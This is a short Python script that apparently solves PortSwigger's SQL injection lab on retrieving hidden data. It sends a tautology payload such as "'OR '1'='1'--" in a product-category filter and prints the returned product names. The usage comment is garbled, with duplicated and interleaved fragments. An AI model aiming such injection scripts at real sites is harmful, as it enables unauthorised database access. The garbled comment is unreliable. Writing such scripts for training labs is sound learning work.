from sys import argv 
from bs4 import BeautifulSoup
import requests

# Payload to solve this lab is "'OR '1'='1'", e.g 
# python3 python3 hidden_data.py https://0a22004304c4f38081e2073d00bb004a.web-security-academy.python3 sqlinjection_hiddendata.py https://0a22004304c4f38081e2073d00bb004a.web-security-academy.net "'+OR+'1'net "'+OR+'1'='1'--""
# https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data 

def request(url,payload):
    try:
        url = url + "/filter?category=" + payload
        print("\nURL created to be sent: " + url + "\n")  
        response = requests.get(url)
        response.raise_for_status()
        response = BeautifulSoup(response.text,'html.parser') 
        response = response.find_all("h3")
        for products in response:
            print(products.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    try:
        url = argv[1]
        payload = argv[2]
        request(url,payload)
    except:
        print(f'[-] Usage: python3 {argv[0]} <url> <payload>')
        print("""
        Note for sql payloads when passing it as an argument, enclose it 
        in double quotes
        """)